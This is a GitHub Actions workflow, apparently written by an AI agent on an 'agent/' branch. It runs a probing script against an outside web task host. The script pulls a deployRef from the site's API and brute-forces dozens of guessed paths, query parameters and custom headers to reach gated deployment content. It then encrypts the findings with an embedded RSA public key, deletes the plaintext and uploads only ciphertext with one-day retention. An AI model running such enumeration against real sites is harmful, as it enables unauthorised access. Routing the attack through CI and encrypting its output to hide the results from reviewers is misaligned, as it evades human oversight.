name: launchlet-part2-gated-discovery

on:
  push:
    branches: [agent/launchlet-part2-gated-discovery-20260808]

permissions:
  contents: read

jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - name: Probe deployRef slug/assets and encrypt differences
        shell: bash
        run: |
          set -euo pipefail
          umask 077
          mkdir -p package/out
          cat > package/public.pem <<'PEM'
          -----BEGIN PUBLIC KEY-----
          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
          SQIDAQAB
          -----END PUBLIC KEY-----
          PEM
          python3 - <<'PY'
          import requests,pathlib,urllib.parse,json
          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru/'
          out=pathlib.Path('package/out'); s=requests.Session(); s.headers['User-Agent']='Mozilla/5.0'
          boot=s.get(urllib.parse.urljoin(base,'/api/app/bootstrap'),timeout=15).json(); refs=s.get(urllib.parse.urljoin(base,boot['api']['serverReferences']),timeout=15).json(); act=refs['serverActions']['inspectDeploy']
          h={'X-Launchlet-Preview':boot['project'],'User-Agent':'Mozilla/5.0'}
          inv=s.post(urllib.parse.urljoin(base,act['endpoint']),headers={**h,'Accept':'application/json','Content-Type':'application/json'},json={'actionId':act['id'],'args':{'workspaceId':boot['workspace'],'projectId':boot['project']}},timeout=15).json()
          ref=inv['inspector']['deployRef']
          paths=[
            f'/{ref}',f'/{ref}/',f'/{ref}/index.html',f'/{ref}/manifest.json',f'/{ref}/deploy.json',f'/{ref}/build-manifest.json',
            f'/assets/{ref}.json',f'/assets/{ref}.html',f'/assets/{ref}/manifest.json',f'/assets/{ref}/index.html',f'/assets/deploy-{ref}.json',f'/assets/deployment-{ref}.json',f'/assets/preview-{ref}.json',f'/assets/deploys/{ref}.json',f'/assets/deployments/{ref}.json',f'/assets/previews/{ref}.json',f'/assets/deploy/{ref}.json',f'/assets/preview/{ref}.json',f'/assets/artifacts/{ref}.json',
            f'/static/{ref}',f'/static/{ref}.json',f'/static/{ref}.html',f'/static/{ref}/index.html',f'/static/deploy/{ref}',f'/static/preview/{ref}',f'/static/deploys/{ref}',f'/static/previews/{ref}',
          ]
          hits=[]
          for path in paths:
              try:
                  r=s.get(urllib.parse.urljoin(base,path),headers=h,timeout=10,allow_redirects=False)
                  if r.status_code!=404: hits.append({'path':path,'status':r.status_code,'headers':dict(r.headers),'body':r.text[:30000]})
              except Exception: pass
          baseline=s.get(base,headers=h,timeout=10,allow_redirects=False)
          queries=['deployRef','deploy_ref','deploy','deployment','preview','ref','id','build','artifact','previewRef','preview_ref']
          for k in queries:
              for v in [ref,boot['project']]:
                  try:
                      u=base+'?'+urllib.parse.urlencode({k:v}); r=s.get(u,headers=h,timeout=10,allow_redirects=False)
                      if r.status_code!=baseline.status_code or r.text!=baseline.text:
                          hits.append({'path':'/?'+urllib.parse.urlencode({k:v}),'status':r.status_code,'headers':dict(r.headers),'body':r.text[:30000]})
                  except Exception: pass
          # Same root with deploy-ref style headers.
          for hk in ['X-Launchlet-Deploy','X-Launchlet-Deploy-Ref','X-Launchlet-Deployment','X-Launchlet-Ref','X-Launchlet-Preview-Ref','X-Deploy-Ref','X-Preview-Ref']:
              r=s.get(base,headers={**h,hk:ref},timeout=10,allow_redirects=False)
              if r.status_code!=baseline.status_code or r.text!=baseline.text:
                  hits.append({'path':'/','request_header':{hk:ref},'status':r.status_code,'headers':dict(r.headers),'body':r.text[:30000]})
          (out/'summary.json').write_text(json.dumps({'deployRef':ref,'hits':hits},indent=2))
          PY
          tar -C package/out -czf package/result.tgz .
          openssl rand 32 > package/aes.key
          openssl rand 16 > package/iv.bin
          KEY_HEX="$(python3 -c "print(open('package/aes.key','rb').read().hex())")"
          IV_HEX="$(python3 -c "print(open('package/iv.bin','rb').read().hex())")"
          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
          mkdir -p artifact
          base64 -w0 package/result.enc > artifact/result.enc.b64
          base64 -w0 package/key.enc > artifact/key.enc.b64
          base64 -w0 package/iv.bin > artifact/iv.bin.b64
          rm -rf package
      - uses: actions/upload-artifact@v4
        with:
          name: launchlet-part2-slug-encrypted
          path: artifact/
          retention-days: 1
